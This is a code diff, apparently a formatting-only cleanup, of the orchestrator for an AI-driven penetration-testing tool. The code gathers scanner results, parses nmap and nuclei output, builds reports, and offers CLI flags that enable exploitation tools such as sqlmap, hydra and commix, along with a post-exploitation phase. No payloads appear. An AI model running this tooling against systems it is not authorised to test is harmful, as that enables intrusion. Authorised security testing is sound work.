+                        metadata={"vuln_id": vuln.vuln_id, "cvss": vuln.cvss_score},
                     )
                     self._add_finding(finding)
                     findings_added.append(finding)
                     # Collect for JSON output
-                    vuln_list.append({
-                        "vuln_id": vuln.vuln_id,
-                        "name": vuln.name,
-                        "severity": vuln.severity,
-                        "description": vuln.description,
-                        "affected_url": vuln.affected_url,
-                        "cvss_score": vuln.cvss_score
-                    })
+                    vuln_list.append(
+                        {
+                            "vuln_id": vuln.vuln_id,
+                            "name": vuln.name,
+                            "severity": vuln.severity,
+                            "description": vuln.description,
+                            "affected_url": vuln.affected_url,
+                            "cvss_score": vuln.cvss_score,
+                        }
+                    )
 
                 if vulns:
                     print(f"    \033[92m✓ Found {len(vulns)} vulnerabilities\033[0m")
                 else:
-                    print(f"    \033[93m⚠ No vulnerabilities found yet (scan may still be running)\033[0m")
+                    print(
+                        "    \033[93m⚠ No vulnerabilities found yet (scan may still be running)\033[0m"
+                    )
 
                 # Always update acunetix_scan.json with current results
                 acunetix_json_path = self.output_dir / "acunetix_scan.json"
@@ -6369,7 +7254,11 @@ class Orchestrator:
 
                 issue_list = []
                 for issue in issues:
-                    sev = issue.severity.value if hasattr(issue.severity, 'value') else str(issue.severity)
+                    sev = (
+                        issue.severity.value
+                        if hasattr(issue.severity, "value")
+                        else str(issue.severity)
+                    )
                     finding = Finding(
                         type="vulnerability",
                         value=issue.name,
@@ -6378,24 +7267,29 @@ class Orchestrator:
                         phase="scan",
                         tool="burp",
                         target=issue.url,
-                        metadata={"issue_id": issue.serial_number, "confidence": str(issue.confidence)}
+                        metadata={
+                            "issue_id": issue.serial_number,
+                            "confidence": str(issue.confidence),
+                        },
                     )
                     self._add_finding(finding)
                     findings_added.append(finding)
                     # Collect for JSON output
-                    issue_list.append({
-                        "issue_id": issue.serial_number,
-                        "name": issue.name,
-                        "severity": sev,
-                        "description": issue.description,
-                        "url": issue.url,
-                        "confidence": str(issue.confidence)
-                    })
+                    issue_list.append(
+                        {
+                            "issue_id": issue.serial_number,
+                            "name": issue.name,
+                            "severity": sev,
+                            "description": issue.description,
+                            "url": issue.url,
+                            "confidence": str(issue.confidence),
+                        }
+                    )
 
                 if issues:
                     print(f"    \033[92m✓ Found {len(issues)} issues\033[0m")
                 else:
-                    print(f"    \033[93m⚠ No issues found yet (scan may still be running)\033[0m")
+                    print("    \033[93m⚠ No issues found yet (scan may still be running)\033[0m")
 
                 # Always save burp_scan.json with current results
                 burp_json_path = self.output_dir / "burp_scan.json"
@@ -6406,7 +7300,7 @@ class Orchestrator:
                     "progress": status.progress,
                     "issues": issue_list,
                     "issue_count": len(issue_list),
-                    "collected_at": datetime.now(timezone.utc).isoformat()
+                    "collected_at": datetime.now(timezone.utc).isoformat(),
                 }
                 burp_json_path.write_text(json.dumps(burp_data, indent=2))
 
@@ -6455,7 +7349,9 @@ class Orchestrator:
                 # Get final status (with single retry for flaky connections)
                 status = nessus.get_scan_status(scan_id, silent=True)
                 if status.status == "unreachable":
-                    results_summary["failed"].append({"scanner": "nessus", "error": "Server unreachable"})
+                    results_summary["failed"].append(
+                        {"scanner": "nessus", "error": "Server unreachable"}
+                    )
 
                 # Always try to get vulnerabilities if server is reachable (even partial results)
                 vuln_list = []
@@ -6471,26 +7367,34 @@ class Orchestrator:
                             phase="scan",
                             tool="nessus",
                             target=f"{vuln.host}:{vuln.port}",
-                            metadata={"plugin_id": vuln.plugin_id, "cvss": vuln.cvss_score, "cve": vuln.cve}
+                            metadata={
+                                "plugin_id": vuln.plugin_id,
+                                "cvss": vuln.cvss_score,
+                                "cve": vuln.cve,
+                            },
                         )
                         self._add_finding(finding)
                         findings_added.append(finding)
                         # Collect for JSON output
-                        vuln_list.append({
-                            "plugin_id": vuln.plugin_id,
-                            "plugin_name": vuln.plugin_name,
-                            "severity": vuln.severity_name,
-                            "description": vuln.description,
-                            "host": vuln.host,
-                            "port": vuln.port,
-                            "cvss_score": vuln.cvss_score,
-                            "cve": vuln.cve
-                        })
+                        vuln_list.append(
+                            {
+                                "plugin_id": vuln.plugin_id,
+                                "plugin_name": vuln.plugin_name,
+                                "severity": vuln.severity_name,
+                                "description": vuln.description,
+                                "host": vuln.host,
+                                "port": vuln.port,
+                                "cvss_score": vuln.cvss_score,
+                                "cve": vuln.cve,
+                            }
+                        )
 
                     if vulns:
                         print(f"    \033[92m✓ Found {len(vulns)} vulnerabilities\033[0m")
                     else:
-                        print(f"    \033[93m⚠ No vulnerabilities found yet (scan may still be running)\033[0m")
+                        print(
+                            "    \033[93m⚠ No vulnerabilities found yet (scan may still be running)\033[0m"
+                        )
 
                 # Always save nessus_scan.json with current results
                 nessus_json_path = self.output_dir / "nessus_scan.json"
@@ -6501,7 +7405,7 @@ class Orchestrator:
                     "progress": status.progress,
                     "vulnerabilities": vuln_list,
                     "vulnerability_count": len(vuln_list),
-                    "collected_at": datetime.now(timezone.utc).isoformat()
+                    "collected_at": datetime.now(timezone.utc).isoformat(),
                 }
                 nessus_json_path.write_text(json.dumps(nessus_data, indent=2))
 
@@ -6556,26 +7460,32 @@ class Orchestrator:
                         phase="scan",
                         tool="zap",
                         target=alert.url,
-                        metadata={"alert_id": alert.alert_id, "cwe_id": alert.cwe_id, "confidence": alert.confidence_name}
+                        metadata={
+                            "alert_id": alert.alert_id,
+                            "cwe_id": alert.cwe_id,
+                            "confidence": alert.confidence_name,
+                        },
                     )
                     self._add_finding(finding)
                     findings_added.append(finding)
                     # Collect for JSON output
-                    alert_list.append({
-                        "alert_id": alert.alert_id,
-                        "name": alert.name,
-                        "severity": sev,
-                        "risk": alert.risk,
-                        "description": alert.description,
-                        "url": alert.url,
-                        "cwe_id": alert.cwe_id,
-                        "confidence": alert.confidence_name
-                    })
+                    alert_list.append(
+                        {
+                            "alert_id": alert.alert_id,
+                            "name": alert.name,
+                            "severity": sev,
+                            "risk": alert.risk,
+                            "description": alert.description,
+                            "url": alert.url,
+                            "cwe_id": alert.cwe_id,
+                            "confidence": alert.confidence_name,
+                        }
+                    )
 
                 if alerts:
                     print(f"    \033[92m✓ Found {len(alerts)} alerts\033[0m")
                 else:
-                    print(f"    \033[93m⚠ No alerts found yet (scan may still be running)\033[0m")
+                    print("    \033[93m⚠ No alerts found yet (scan may still be running)\033[0m")
 
                 # Always save zap_scan.json with current results
                 zap_json_path = self.output_dir / "zap_scan.json"
@@ -6609,7 +7519,7 @@ class Orchestrator:
         print(f"  Scanners still running: {len(results_summary['still_running'])}")
         print(f"  Scanners failed: {len(results_summary['failed'])}")
         print(f"  Total new findings: \033[92m{len(findings_added)}\033[0m")
-        print("="*width + "\n")
+        print("=" * width + "\n")
 
         # Save scanner results to file
         (self.output_dir / "scanner_results_summary.json").write_text(
@@ -6620,11 +7530,7 @@ class Orchestrator:
 
     # ==================== VPS INTEGRATION ====================
 
-    async def _run_command_on_vps(
-        self,
-        command: str,
-        timeout: int = 120
-    ) -> tuple[int, str]:
+    async def _run_command_on_vps(self, command: str, timeout: int = 120) -> tuple[int, str]:
         """
         Run a command on VPS instead of locally.
 
@@ -6645,9 +7551,7 @@ class Orchestrator:
 
             try:
                 stdout, stderr, code = await runtime.execute(
-                    sandbox.sandbox_id,
-                    command,
-                    timeout=timeout
+                    sandbox.sandbox_id, command, timeout=timeout
                 )
                 output = stdout if stdout else stderr
                 return code, output
@@ -6659,9 +7563,7 @@ class Orchestrator:
             return await self._run_command(command, timeout)
 
     async def run_vps_scan(
-        self,
-        scan_type: str = "standard",
-        tools: Optional[List[str]] = None
+        self, scan_type: str = "standard", tools: Optional[List[str]] = None
     ) -> Dict[str, Any]:
         """
         Run a complete scan using VPS.
@@ -6676,23 +7578,21 @@ class Orchestrator:
             Dict with scan results
         """
         if not VPS_AVAILABLE:
-            raise RuntimeError("VPS runtime not available. Install asyncssh: pip install aiptx[full]")
+            raise RuntimeError(
+                "VPS runtime not available. Install asyncssh: pip install aiptx[full]"
+            )
 
         width = self._get_terminal_width() - 4
-        print("\n" + "="*width)
+        print("\n" + "=" * width)
         print("  🖥️  VPS REMOTE SCAN")
-        print("="*width)
+        print("=" * width)
 
         try:
             runtime = await get_vps_runtime()
             print(f"  Connected to VPS: {runtime.host}")
 
             # Run scan on VPS
-            results = await runtime.run_scan(
-                target=self.target,
-                scan_type=scan_type,
-                tools=tools
-            )
+            results = await runtime.run_scan(target=self.target, scan_type=scan_type, tools=tools)
 
             print(f"  Scan completed: {results.get('completed_at', 'N/A')}")
             print(f"  Results stored: {results.get('local_results_path', 'N/A')}")
@@ -6705,7 +7605,7 @@ class Orchestrator:
                         # Parse tool-specific output
                         self._parse_vps_tool_output(tool_name, stdout)
 
-            print("="*width + "\n")
+            print("=" * width + "\n")
             return results
 
         except Exception as e:
@@ -6720,34 +7620,39 @@ class Orchestrator:
                 for line in output.strip().split("\n"):
                     if line.strip():
                         data = json.loads(line)
-                        self._add_finding(Finding(
-                            type="vulnerability",
-                            value=data.get("info", {}).get("name", "Unknown"),
-                            description=data.get("info", {}).get("description", ""),
-                            severity=data.get("info", {}).get("severity", "info"),
-                            phase="scan",
-                            tool="nuclei_vps",
-                            target=data.get("matched-at", self.target),
-                            metadata={"template_id": data.get("template-id")}
-                        ))
+                        self._add_finding(
+                            Finding(
+                                type="vulnerability",
+                                value=data.get("info", {}).get("name", "Unknown"),
+                                description=data.get("info", {}).get("description", ""),
+                                severity=data.get("info", {}).get("severity", "info"),
+                                phase="scan",
+                                tool="nuclei_vps",
+                                target=data.get("matched-at", self.target),
+                                metadata={"template_id": data.get("template-id")},
+                            )
+                        )
             except json.JSONDecodeError:
                 pass
 
         elif tool_name == "nmap" and output.strip():
             # Parse nmap output for open ports
             import re
-            port_pattern = re.compile(r'(\d+)/tcp\s+open\s+(\S+)')
+
+            port_pattern = re.compile(r"(\d+)/tcp\s+open\s+(\S+)")
             for match in port_pattern.finditer(output):
                 port, service = match.groups()
-                self._add_finding(Finding(
-                    type="open_port",
-                    value=f"{port}/{service}",
-                    description=f"Open port {port} running {service}",
-                    severity="info",
-                    phase="scan",
-                    tool="nmap_vps",
-                    target=self.target
-                ))
+                self._add_finding(
+                    Finding(
+                        type="open_port",
+                        value=f"{port}/{service}",
+                        description=f"Open port {port} running {service}",
+                        severity="info",
+                        phase="scan",
+                        tool="nmap_vps",
+                        target=self.target,
+                    )
+                )
 
     # ==================== REPORT PHASE ====================
 
@@ -6782,16 +7687,18 @@ class Orchestrator:
                 "tool": f.tool,
                 "target": f.target,
                 "metadata": f.metadata,
-                "timestamp": f.timestamp
+                "timestamp": f.timestamp,
             }
             for f in self.findings
         ]
-        (self.output_dir / "findings.json").write_text(json.dumps(findings_data, indent=2), encoding="utf-8")
+        (self.output_dir / "findings.json").write_text(
+            json.dumps(findings_data, indent=2), encoding="utf-8"
+        )
         tools_run.append("findings_export")
         self._log_tool("Findings exported", "done")
 
         # 2b. Export canonical/verified findings if pipeline ran
-        if hasattr(self, 'canonical_findings') and self.canonical_findings:
+        if hasattr(self, "canonical_findings") and self.canonical_findings:
             try:
                 canonical = self.canonical_findings
                 # Export verified findings in FindingV2 format
@@ -6801,13 +7708,19 @@ class Orchestrator:
                 )
 
                 # Export confirmed-only findings (for quick reference)
-                confirmed_data = [f.to_dict() for f in canonical.findings if f.verification_status.value == 'confirmed']
+                confirmed_data = [
+                    f.to_dict()
+                    for f in canonical.findings
+                    if f.verification_status.value == "confirmed"
+                ]
                 (self.output_dir / "confirmed_findings.json").write_text(
                     json.dumps(confirmed_data, indent=2, default=str), encoding="utf-8"
                 )
 
                 tools_run.append("verified_findings_export")
-                self._log_tool(f"Verified findings exported ({len(confirmed_data)} confirmed)", "done")
+                self._log_tool(
+                    f"Verified findings exported ({len(confirmed_data)} confirmed)", "done"
+                )
             except Exception as e:
                 logger.warning(f"Failed to export canonical findings: {e}")
                 errors.append(f"canonical_export: {e}")
@@ -6818,12 +7731,12 @@ class Orchestrator:
             report_file = self.output_dir / f"VAPT_Report_{self.domain.replace('.', '_')}.html"
 
             # Try to use new ReportGenerator with canonical findings
-            if hasattr(self, 'canonical_findings') and self.canonical_findings:
+            if hasattr(self, "canonical_findings") and self.canonical_findings:
                 try:
-                    from aipt_v2.reports.generator import ReportGenerator, ReportConfig
+                    from aipt_v2.reports.generator import ReportConfig, ReportGenerator
 
                     config = ReportConfig(
-                        client_name=getattr(self.config, 'client_name', 'Security Assessment'),
+                        client_name=getattr(self.config, "client_name", "Security Assessment"),
                         output_dir=self.output_dir,
                         include_evidence=True,
                         include_screenshots=True,
@@ -6832,8 +7745,8 @@ class Orchestrator:
 
                     # Generate from canonical findings
                     reports = await generator.generate_from_canonical(self.canonical_findings)
-                    if reports and 'html' in reports:
-                        html_report = reports['html']
+                    if reports and "html" in reports:
+                        html_report = reports["html"]
                         tools_run.append("html_report_v2")
                         self._log_tool(f"HTML Report (verified): {report_file.name}", "done")
                 except Exception as e:
@@ -6857,7 +7770,9 @@ class Orchestrator:
         total_json = len(json_validation)
         if valid_count < total_json:
             invalid_files = [k for k, v in json_validation.items() if not v]
-            errors.append(f"json_validation: {len(invalid_files)} invalid files: {', '.join(invalid_files)}")
+            errors.append(
+                f"json_validation: {len(invalid_files)} invalid files: {', '.join(invalid_files)}"
+            )
 
         duration = time.time() - start_time
         result = PhaseResult(
@@ -6873,7 +7788,7 @@ class Orchestrator:
                 "output_dir": str(self.output_dir),
                 "total_findings": len(self.findings),
                 "json_validation": json_validation,
-            }
+            },
         )
 
         self.phase_results[phase] = result
@@ -6884,15 +7799,16 @@ class Orchestrator:
 
     def _generate_summary(self) -> str:
         """Generate markdown summary with verification filtering."""
+
         # Filter findings by verification status (if available in metadata)
         def is_reportable(f) -> bool:
             """Check if finding should be included in report based on verification."""
-            metadata = f.metadata if hasattr(f, 'metadata') and f.metadata else {}
-            verification_status = metadata.get('verification_status', 'unverified')
-            is_false_positive = metadata.get('false_positive', False)
+            metadata = f.metadata if hasattr(f, "metadata") and f.metadata else {}
+            verification_status = metadata.get("verification_status", "unverified")
+            is_false_positive = metadata.get("false_positive", False)
 
             # Never report false positives
-            if is_false_positive or verification_status == 'false_positive':
+            if is_false_positive or verification_status == "false_positive":
                 return False
 
             # Get severity
@@ -6902,20 +7818,27 @@ class Orchestrator:
             sev = str(sev).lower()
 
             # Critical/High must be confirmed
-            if sev in ['critical', 'high']:
-                return verification_status == 'confirmed'
+            if sev in ["critical", "high"]:
+                return verification_status == "confirmed"
 
             # Medium can be confirmed or likely
-            if sev == 'medium':
-                return verification_status in ['confirmed', 'likely']
+            if sev == "medium":
+                return verification_status in ["confirmed", "likely"]
 
             # Low/Info can be anything except false_positive or unverified
-            return verification_status not in ['unverified', 'pending', 'false_positive']
+            return verification_status not in ["unverified", "pending", "false_positive"]
 
         # Get reportable findings
         reportable_findings = [f for f in self.findings if is_reportable(f)]
         total_discovered = len(self.findings)
-        false_positives_count = len([f for f in self.findings if f.metadata.get('false_positive', False) if hasattr(f, 'metadata') and f.metadata])
+        false_positives_count = len(
+            [
+                f
+                for f in self.findings
+                if f.metadata.get("false_positive", False)
+                if hasattr(f, "metadata") and f.metadata
+            ]
+        )
 
         severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
         for f in reportable_findings:
@@ -6929,7 +7852,9 @@ class Orchestrator:
 
         phases_info = []
         for phase, result in self.phase_results.items():
-            phases_info.append(f"| {phase.value.upper()} | {result.status} | {result.duration:.1f}s | {len(result.findings)} |")
+            phases_info.append(
+                f"| {phase.value.upper()} | {result.status} | {result.duration:.1f}s | {len(result.findings)} |"
+            )
 
         # Build verification summary section if we filtered anything
         verification_section = ""
@@ -7001,23 +7926,25 @@ class Orchestrator:
             "cors_misconfiguration": lambda f: f.value,
             "potential_vulnerability": lambda f: f.value,
             "certificate_info": lambda f: f.value,
-            "attack_surface_analysis": lambda f: f"Attack Surface: {f.value}" if f.value else "Attack Surface Analysis",
+            "attack_surface_analysis": lambda f: (
+                f"Attack Surface: {f.value}" if f.value else "Attack Surface Analysis"
+            ),
         }
 
-        finding_type = getattr(finding, 'type', '')
+        finding_type = getattr(finding, "type", "")
 
         # Use title map if available
         if finding_type in title_map:
             return title_map[finding_type](finding)
 
         # For other types, use value if it's descriptive (not just a number)
-        value = getattr(finding, 'value', '')
-        if value and not (value.isdigit() or value in ['0', '']):
+        value = getattr(finding, "value", "")
+        if value and not (value.isdigit() or value in ["0", ""]):
             return value
 
         # Fallback: format type as title
         if finding_type:
-            return finding_type.replace('_', ' ').title()
+            return finding_type.replace("_", " ").title()
 
         return "Unknown Finding"
 
@@ -7150,13 +8077,21 @@ class Orchestrator:
             Complete results dictionary
         """
         if phases is None:
-            phases = [Phase.RECON, Phase.SCAN, Phase.ANALYZE, Phase.EXPLOIT, Phase.VERIFY, Phase.POST_EXPLOIT, Phase.REPORT]
+            phases = [
+                Phase.RECON,
+                Phase.SCAN,
+                Phase.ANALYZE,
+                Phase.EXPLOIT,
+                Phase.VERIFY,
+                Phase.POST_EXPLOIT,
+                Phase.REPORT,
+            ]
 
         start_time = time.time()
 
-        print("\n" + "="*60)
+        print("\n" + "=" * 60)
         print("  AIPT - AI-Powered Penetration Testing (v2.1 - Maximum Tools)")
-        print("="*60)
+        print("=" * 60)
         print(f"  Target: {self.domain}")
         print(f"  Output: {self.output_dir}")
         print(f"  Mode: {'FULL (All Tools)' if self.config.full_mode else 'Standard'}")
@@ -7167,19 +8102,23 @@ class Orchestrator:
         print(f"  ZAP: {'Enabled' if self.config.use_zap else 'Disabled'}")
         print(f"  ZoomEye: {'Enabled' if self.config.use_zoomeye else 'Disabled'}")
         print(f"  VPS: {'Enabled' if self.config.use_vps else 'Local'}")
-        print(f"  Exploitation: {'Enabled' if (self.config.full_mode or self.config.enable_exploitation) else 'Disabled'}")
-        print(f"  Final Scanner Collection: {'Enabled' if self.config.collect_scanner_results_at_end else 'Disabled'}")
-        print("="*60 + "\n")
+        print(
+            f"  Exploitation: {'Enabled' if (self.config.full_mode or self.config.enable_exploitation) else 'Disabled'}"
+        )
+        print(
+            f"  Final Scanner Collection: {'Enabled' if self.config.collect_scanner_results_at_end else 'Disabled'}"
+        )
+        print("=" * 60 + "\n")
 
         # Time estimate warning for --full mode
         if self.config.full_mode and self.config.wait_for_scanners:
-            print("\033[1;33m" + "="*60)
+            print("\033[1;33m" + "=" * 60)
             print("  ⚠️  FULL MODE - ESTIMATED TIME: 60-90 MINUTES")
-            print("="*60 + "\033[0m")
+            print("=" * 60 + "\033[0m")
             print("  Enterprise scanners (Acunetix, Nessus, Burp, ZAP) run in")
             print("  background. Partial results collected if they timeout.")
             print("  Use \033[1m--quick\033[0m for faster scans without enterprise scanners.")
-            print("="*60 + "\n")
+            print("=" * 60 + "\n")
 
         # Initialize live findings panel for real-time updates
         self._scan_start_time = time.time()
@@ -7188,30 +8127,36 @@ class Orchestrator:
 
         # Hook up the live panel to capture findings
         original_on_finding = self.on_finding
+
         def live_panel_finding_callback(finding):
             if self._live_panel:
                 self._live_panel.add_finding(finding)
             if original_on_finding:
                 original_on_finding(finding)
+
         self.on_finding = live_panel_finding_callback
 
         # Hook up the live panel to capture phase changes
         original_on_phase_start = self.on_phase_start
+
         def live_panel_phase_callback(phase):
             if self._live_panel:
                 self._live_panel.set_current_phase(phase.value.upper())
             if original_on_phase_start:
                 original_on_phase_start(phase)
+
         self.on_phase_start = live_panel_phase_callback
 
         # Hook up the live panel to show status after phase completion
         original_on_phase_complete = self.on_phase_complete
+
         def live_panel_phase_complete_callback(result):
             # Show live status after each phase (compact format)
             if self._live_panel:
                 self._print_live_status()
             if original_on_phase_complete:
                 original_on_phase_complete(result)
+
         self.on_phase_complete = live_panel_phase_complete_callback
 
         try:
@@ -7253,9 +8198,9 @@ class Orchestrator:
                     from aipt_v2.pipeline.integration import PipelineIntegration
 
                     logger.info("Running pipeline integration (normalize, dedupe, verify)...")
-                    print("\n" + "="*70)
+                    print("\n" + "=" * 70)
                     print("  [PIPELINE] Running Finding Verification Pipeline")
-                    print("="*70 + "\n")
+                    print("=" * 70 + "\n")
 
                     integration = PipelineIntegration(
                         self,
@@ -7270,7 +8215,7 @@ class Orchestrator:
                     # Print verification summary
                     if self.canonical_findings:
                         summary = self.canonical_findings.summary
-                        print(f"  ✓ Pipeline Complete:")
+                        print("  ✓ Pipeline Complete:")
                         print(f"    Total Raw: {summary.total_raw}")
                         print(f"    After Dedup: {summary.after_dedup}")
                         print(f"    Confirmed: {summary.confirmed}")
@@ -7279,7 +8224,9 @@ class Orchestrator:
                         print(f"    False Positives: {summary.suppressed_fp}")
                         print()
                 except Exception as e:
-                    logger.warning(f"Pipeline integration failed, continuing with legacy report: {e}")
+                    logger.warning(
+                        f"Pipeline integration failed, continuing with legacy report: {e}"
+                    )
                     self.canonical_findings = None
 
             if Phase.REPORT in phases and not self.config.skip_report:
@@ -7293,9 +8240,9 @@ class Orchestrator:
 
         # Final summary - categorized findings with full terminal width
         width = self._get_terminal_width() - 4  # Leave small margin
-        print("\n" + "="*width)
+        print("\n" + "=" * width)
         print("  \033[1;32m✓ SCAN COMPLETE\033[0m")
-        print("="*width)
+        print("=" * width)
 
         # Show live findings panel summary
         if self._live_panel and self._live_panel.get_total_count() > 0:
@@ -7306,16 +8253,43 @@ class Orchestrator:
         if self.findings:
             # Group findings by type - include all vulnerability-related types
             vuln_types = (
-                "vulnerability", "cve", "web_vulnerability", "ssl_vulnerability",
-                "wordpress_vulnerability", "container_vulnerability", "xss_vulnerability",
-                "exposed_endpoint", "exposed_git", "sqli_vulnerability", "credential_found",
-                "sensitive_exposure", "misconfig", "weak_cipher", "waf_bypass",
-                "potential_exploit", "secret", "verified_secret"
+                "vulnerability",
+                "cve",
+                "web_vulnerability",
+                "ssl_vulnerability",
+                "wordpress_vulnerability",
+                "container_vulnerability",
+                "xss_vulnerability",
+                "exposed_endpoint",
+                "exposed_git",
+                "sqli_vulnerability",
+                "credential_found",
+                "sensitive_exposure",
+                "misconfig",
+                "weak_cipher",
+                "waf_bypass",
+                "potential_exploit",
+                "secret",
+                "verified_secret",
             )
-            vuln_findings = [f for f in self.findings if f.type in vuln_types or "vuln" in f.type.lower() or "exploit" in f.type.lower() or "exposed" in f.type.lower()]
+            vuln_findings = [
+                f
+                for f in self.findings
+                if f.type in vuln_types
+                or "vuln" in f.type.lower()
+                or "exploit" in f.type.lower()
+                or "exposed" in f.type.lower()
+            ]
             subdomain_findings = [f for f in self.findings if f.type == "subdomain"]
             port_findings = [f for f in self.findings if f.type in ("port", "open_port")]
-            other_findings = [f for f in self.findings if f.type not in vuln_types and f.type not in ("subdomain", "port", "open_port", "subdomain_count", "discovered_host") and "vuln" not in f.type.lower()]
+            other_findings = [
+                f
+                for f in self.findings
+                if f.type not in vuln_types
+                and f.type
+                not in ("subdomain", "port", "open_port", "subdomain_count", "discovered_host")
+                and "vuln" not in f.type.lower()
+            ]
 
             # Helper to safely get severity string
             def get_sev(f):
@@ -7363,7 +8337,7 @@ class Orchestrator:
         if self.attack_chains:
             print(f"  Attack Chains: {len(self.attack_chains)}")
         print(f"  Output: {self.output_dir}")
-        print("="*width + "\n")
+        print("=" * width + "\n")
 
         return {
             "target": self.target,
@@ -7373,11 +8347,12 @@ class Orchestrator:
             "findings_count": len(self.findings),
             "attack_chains_count": len(self.attack_chains),
             "scan_ids": self.scan_ids,
-            "output_dir": str(self.output_dir)
+            "output_dir": str(self.output_dir),
         }
 
 
 # ==================== CLI ====================
+
 
 async def main():
     """CLI entry point."""
@@ -7408,7 +8383,7 @@ Scanner Result Collection:
   By default, enterprise scanner results are collected just before report generation.
   Use --wait to wait for all scanners to complete before collection.
   Use --no-final-scan-results to skip final collection (results from in-progress scans only).
-        """
+        """,
     )
 
     # Target
@@ -7416,10 +8391,12 @@ Scanner Result Collection:
     parser.add_argument("-o", "--output", default="./scan_results", help="Output directory")
 
     # Scan modes
-    parser.add_argument("--full", action="store_true",
-                       help="Enable FULL mode with all tools including exploitation")
-    parser.add_argument("--exploit", action="store_true",
-                       help="Enable exploitation tools (sqlmap, hydra, commix)")
+    parser.add_argument(
+        "--full", action="store_true", help="Enable FULL mode with all tools including exploitation"
+    )
+    parser.add_argument(
+        "--exploit", action="store_true", help="Enable exploitation tools (sqlmap, hydra, commix)"
+    )
 
     # Phase control
     parser.add_argument("--skip-recon", action="store_true", help="Skip reconnaissance phase")
@@ -7432,43 +8409,61 @@ Scanner Result Collection:
     parser.add_argument("--nessus", action="store_true", help="Enable Nessus scanner")
     parser.add_argument("--zap", action="store_true", help="Enable OWASP ZAP scanner")
     parser.add_argument("--zoomeye", action="store_true", help="Enable ZoomEye intelligence recon")
-    parser.add_argument("--wait", action="store_true", help="Wait for enterprise scanners to complete")
-    parser.add_argument("--acunetix-profile", default="full",
-                       choices=["full", "high_risk", "xss", "sqli"],
-                       help="Acunetix scan profile")
+    parser.add_argument(
+        "--wait", action="store_true", help="Wait for enterprise scanners to complete"
+    )
+    parser.add_argument(
+        "--acunetix-profile",
+        default="full",
+        choices=["full", "high_risk", "xss", "sqli"],
+        help="Acunetix scan profile",
+    )
 
     # SQLMap settings
-    parser.add_argument("--sqlmap-level", type=int, default=2,
-                       help="SQLMap testing level (1-5, default: 2)")
-    parser.add_argument("--sqlmap-risk", type=int, default=2,
-                       help="SQLMap risk level (1-3, default: 2)")
+    parser.add_argument(
+        "--sqlmap-level", type=int, default=2, help="SQLMap testing level (1-5, default: 2)"
+    )
+    parser.add_argument(
+        "--sqlmap-risk", type=int, default=2, help="SQLMap risk level (1-3, default: 2)"
+    )
 
     # DevSecOps
-    parser.add_argument("--container", action="store_true",
-                       help="Enable container security scanning (trivy)")
-    parser.add_argument("--secrets", action="store_true",
-                       help="Enable secret detection (gitleaks, trufflehog)")
+    parser.add_argument(
+        "--container", action="store_true", help="Enable container security scanning (trivy)"
+    )
+    parser.add_argument(
+        "--secrets", action="store_true", help="Enable secret detection (gitleaks, trufflehog)"
+    )
 
     # VPS Remote Execution
-    parser.add_argument("--vps", action="store_true",
-                       help="Run tools on VPS instead of locally")
-    parser.add_argument("--no-final-scan-results", action="store_true",
-                       help="Disable final scanner result collection before report")
+    parser.add_argument("--vps", action="store_true", help="Run tools on VPS instead of locally")
+    parser.add_argument(
+        "--no-final-scan-results",
+        action="store_true",
+        help="Disable final scanner result collection before report",
+    )
 
     # Authentication Options
-    auth_group = parser.add_argument_group('Authentication', 'Options for authenticated scanning')
-    auth_group.add_argument("--auth-token", type=str,
-                           help="Bearer token for API authentication")
-    auth_group.add_argument("--auth-user", type=str,
-                           help="Username for form-based or basic authentication")
-    auth_group.add_argument("--auth-pass", type=str,
-                           help="Password for form-based or basic authentication")
-    auth_group.add_argument("--auth-url", type=str,
-                           help="Login URL for form-based authentication")
-    auth_group.add_argument("--auth-cookie", type=str,
-                           help="Session cookie (format: 'name=value' or 'name1=val1;name2=val2')")
-    auth_group.add_argument("--auth-header", type=str, action="append",
-                           help="Custom auth header (format: 'Header-Name: value'), can be repeated")
+    auth_group = parser.add_argument_group("Authentication", "Options for authenticated scanning")
+    auth_group.add_argument("--auth-token", type=str, help="Bearer token for API authentication")
+    auth_group.add_argument(
+        "--auth-user", type=str, help="Username for form-based or basic authentication"
+    )
+    auth_group.add_argument(
+        "--auth-pass", type=str, help="Password for form-based or basic authentication"
+    )
+    auth_group.add_argument("--auth-url", type=str, help="Login URL for form-based authentication")
+    auth_group.add_argument(
+        "--auth-cookie",
+        type=str,
+        help="Session cookie (format: 'name=value' or 'name1=val1;name2=val2')",
+    )
+    auth_group.add_argument(
+        "--auth-header",
+        type=str,
+        action="append",
+        help="Custom auth header (format: 'Header-Name: value'), can be repeated",
+    )
 
     args = parser.parse_args()
 
@@ -7480,7 +8475,7 @@ Scanner Result Collection:
             method=AuthMethod.BEARER_TOKEN,
             token=args.auth_token,
         )
-        print(f"[*] Using Bearer token authentication")
+        print("[*] Using Bearer token authentication")
     elif args.auth_url and args.auth_user and args.auth_pass:
         # Form-based login
         auth_credentials = AuthCredentials(
@@ -7496,13 +8491,13 @@ Scanner Result Collection:
             username=args.auth_user,
             password=args.auth_pass,
         )
-        print(f"[*] Using HTTP Basic authentication")
+        print("[*] Using HTTP Basic authentication")
     elif args.auth_cookie:
         # Cookie auth
         cookies = {}
-        for pair in args.auth_cookie.split(';'):
-            if '=' in pair:
-                name, value = pair.strip().split('=', 1)
+        for pair in args.auth_cookie.split(";"):
+            if "=" in pair:
+                name, value = pair.strip().split("=", 1)
                 cookies[name] = value
         auth_credentials = AuthCredentials(
             method=AuthMethod.COOKIE,
@@ -7513,8 +8508,8 @@ Scanner Result Collection:
         # Custom headers
         headers = {}
         for header in args.auth_header:
-            if ':' in header:
-                name, value = header.split(':', 1)
+            if ":" in header:
+                name, value = header.split(":", 1)
                 headers[name.strip()] = value.strip()
         auth_credentials = AuthCredentials(
             method=AuthMethod.CUSTOM_HEADER,
@@ -7556,7 +8551,7 @@ Scanner Result Collection:
     print(f"  Output: {results['output_dir']}")
     print(f"  Duration: {results['duration']:.1f}s")
     if config.full_mode:
-        print(f"  Mode: FULL (All exploitation tools enabled)")
+        print("  Mode: FULL (All exploitation tools enabled)")
     print(f"{'='*60}\n")
 
 
